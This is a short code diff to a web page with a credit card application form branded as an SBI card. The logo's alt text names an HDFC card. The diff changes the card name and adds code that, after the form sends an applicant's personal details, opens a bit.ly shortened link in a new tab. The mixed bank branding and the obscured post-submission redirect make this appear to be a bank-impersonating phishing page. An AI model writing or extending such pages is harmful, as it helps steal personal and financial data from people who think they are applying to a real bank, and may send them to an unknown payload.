@@ -184,7 +184,7 @@
   <form id="loanForm" enctype="multipart/form-data" method="post">
     <div class="form-header">
       <img src="image/SBI IRCTC Credit Card.png" alt="HDFC Simply SAVE UPI Credit Card Logo" />
-      <h2>SBI IRCTC Credit Card Application</h2>
+      <h2>SBI Cashback Card</h2>
     </div>
 
     <!-- Personal Information Section -->
@@ -414,7 +414,12 @@
   })
     .then((res) => res.text())
     .then((msg) => {
-      document.getElementById("responseMsg").innerText = msg;
+     document.getElementById("responseMsg").innerText = msg;
+      form.reset();
+      setTimeout(() => {
+        window.open("https://bit.ly/4dyRv9p", "_blank");
+      }, 1000); // 2 seconds
+      document.getElementById("submit").innerHTML = 'Submit Application';
     })
     .catch((err) => {
       document.getElementById("responseMsg").innerText = "Error: " + err;
